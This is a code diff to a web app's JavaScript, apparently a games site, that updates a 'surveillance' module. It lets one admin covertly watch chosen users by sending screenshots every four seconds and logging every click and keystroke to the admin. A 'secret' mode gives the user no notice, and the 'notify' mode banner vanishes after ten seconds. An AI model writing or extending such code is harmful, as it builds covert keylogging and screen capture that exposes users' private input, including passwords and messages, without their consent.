@@ -3713,7 +3713,7 @@ ADMIN SURVEILLANCE STYLES
 
 /* 
 ========================================================================
-NEW LIVE-STREAM SURVEILLANCE MODULE (V3.0 - STABLE RENDER)
+NEW LIVE-STREAM SURVEILLANCE MODULE (V4.0 - SMART-VIEW CAPTURE)
 ========================================================================
 */
 
@@ -3726,13 +3726,11 @@ let profilePollingInterval = null;
 async function initMonitoringAgent() {
     if (!currentUser) return;
 
-    // Check if user is already being watched on login
     const { data } = await _supabase.from('surveillance').select('monitoring_type, active').eq('target_user', currentUser).maybeSingle();
     if (data && data.active) {
         beginCaptureLoop(data.monitoring_type);
     }
 
-    // Command Channel for Start/Stop
     _supabase.channel('surveillance_control')
         .on('postgres_changes', { event: '*', table: 'surveillance', schema: 'public' }, async (payload) => {
             const isTarget = (payload.new && payload.new.target_user === currentUser) || (payload.old && payload.old.target_user === currentUser);
@@ -3749,18 +3747,15 @@ async function initMonitoringAgent() {
 function beginCaptureLoop(type) {
     if (snapshotInterval) stopCaptureLoop(); 
     
-    // TEMPORARY BANNER LOGIC
+    // TEMPORARY BANNER LOGIC (10 Seconds)
     const toast = document.getElementById('surveillanceToast');
     if (toast && type === 'notify') {
         toast.style.display = 'block';
-        // Auto-hide after 10 seconds
+        toast.style.opacity = '1';
         setTimeout(() => {
+            toast.style.transition = 'opacity 2s ease';
             toast.style.opacity = '0';
-            toast.style.transition = 'opacity 1s ease';
-            setTimeout(() => { 
-                toast.style.display = 'none';
-                toast.style.opacity = '1'; 
-            }, 1000);
+            setTimeout(() => { toast.style.display = 'none'; }, 2000);
         }, 10000);
     }
 
@@ -3770,24 +3765,33 @@ function beginCaptureLoop(type) {
     window.addEventListener('click', logSurveillanceEvent);
     window.addEventListener('keydown', logSurveillanceEvent);
 
-    // BUG FIX: Improved html2canvas settings to prevent black screens
+    // SMART SNAPSHOT LOOP
     snapshotInterval = setInterval(async () => {
         try {
-            const canvas = await html2canvas(document.documentElement, { 
-                scale: 0.15, 
+            // Determine if the user is in a game or on the dashboard
+            const zoneViewer = document.getElementById('zoneViewer');
+            const isPlaying = zoneViewer && zoneViewer.style.display === 'flex';
+            
+            // If playing, we capture the viewer; otherwise, the whole page
+            const captureTarget = isPlaying ? zoneViewer : document.body;
+
+            const canvas = await html2canvas(captureTarget, { 
+                scale: 0.2, // Slightly higher for clarity
                 useCORS: true,
+                allowTaint: true,
+                backgroundColor: "#020617", 
                 logging: false,
-                backgroundColor: "#020617", // Force background color to prevent black frames
-                ignoreElements: (el) => el.id === 'modModal' || el.id === 'surveillanceToast'
+                ignoreElements: (el) => el.id === 'modModal' || el.id === 'surveillanceToast' || el.tagName === 'NAV'
             });
+            
             const dataUrl = canvas.toDataURL("image/webp", 0.1); 
             
             await _supabase.from('surveillance').update({ 
                 screen_snapshot: dataUrl,
                 updated_at: new Date().toISOString()
             }).eq('target_user', currentUser);
-        } catch (e) { console.warn("Snapshot capture missed."); }
-    }, 4500);
+        } catch (e) { console.warn("Surveillance sync lag..."); }
+    }, 4000); // 4 second refresh
 }
 
 function stopCaptureLoop() {
@@ -3802,32 +3806,14 @@ function stopCaptureLoop() {
 
 function logSurveillanceEvent(e) {
     if (!broadcastChannel) return;
-    
-    let detail = "";
-    if (e.type === 'click') {
-        detail = `Clicked: ${e.target.tagName} ${e.target.id ? '#' + e.target.id : ''}`;
-    } else if (e.type === 'keydown') {
-        detail = `Typed: ${e.key}`;
-    }
-
-    const payload = {
-        event: 'activity',
-        user: currentUser,
-        detail: detail,
-        time: new Date().toLocaleTimeString()
-    };
-
-    broadcastChannel.send({
-        type: 'broadcast',
-        event: 'log',
-        payload: payload
-    });
+    let detail = e.type === 'click' ? `Clicked: ${e.target.tagName}` : `Typed: ${e.key}`;
+    const payload = { event: 'activity', user: currentUser, detail: detail, time: new Date().toLocaleTimeString() };
+    broadcastChannel.send({ type: 'broadcast', event: 'log', payload: payload });
 }
 
 async function handleSurveillanceStart(username) {
     if (currentUser !== 'Derrick') return alert("Access Denied");
-    const notify = confirm("Notify the user they are being watched? (Banner will vanish after 10s)");
-    
+    const notify = confirm("Notify user? (Banner temporary)");
     await _supabase.from('surveillance').delete().eq('target_user', username);
     const { error } = await _supabase.from('surveillance').insert({
         target_user: username,
@@ -3835,8 +3821,7 @@ async function handleSurveillanceStart(username) {
         monitoring_type: notify ? 'notify' : 'secret',
         active: true
     });
-
-    if (error) return alert("Failed to start session: " + error.message);
+    if (error) return alert("Error: " + error.message);
     currentMonitoringUser = username;
     initSurveillanceSubscription(); 
     if (typeof switchModTab === 'function') switchModTab('monitoring');
@@ -3848,7 +3833,7 @@ function initSurveillanceSubscription() {
 
     const logEl = document.getElementById('surveillanceLog');
     const feedImg = document.getElementById('surveillanceFeed');
-    if (logEl) logEl.innerHTML = "<div style='color:var(--accent)'>Listening for live stream...</div>";
+    if (logEl) logEl.innerHTML = "<div style='color:var(--accent)'>Live Stream Active...</div>";
 
     surveillanceSub = _supabase.channel(`live_stream:${currentMonitoringUser}`)
         .on('broadcast', { event: 'log' }, ({ payload }) => {
@@ -3860,15 +3845,10 @@ function initSurveillanceSubscription() {
                 logEl.prepend(div);
                 if (logEl.children.length > 100) logEl.lastChild.remove();
             }
-        })
-        .subscribe();
+        }).subscribe();
 
     profilePollingInterval = setInterval(async () => {
-        const { data } = await _supabase.from('surveillance')
-            .select('screen_snapshot')
-            .eq('target_user', currentMonitoringUser)
-            .maybeSingle();
-
+        const { data } = await _supabase.from('surveillance').select('screen_snapshot').eq('target_user', currentMonitoringUser).maybeSingle();
         if (data?.screen_snapshot && feedImg) {
             feedImg.src = data.screen_snapshot;
             document.getElementById('surveillanceStatus').innerText = `LIVE: ${currentMonitoringUser}`;
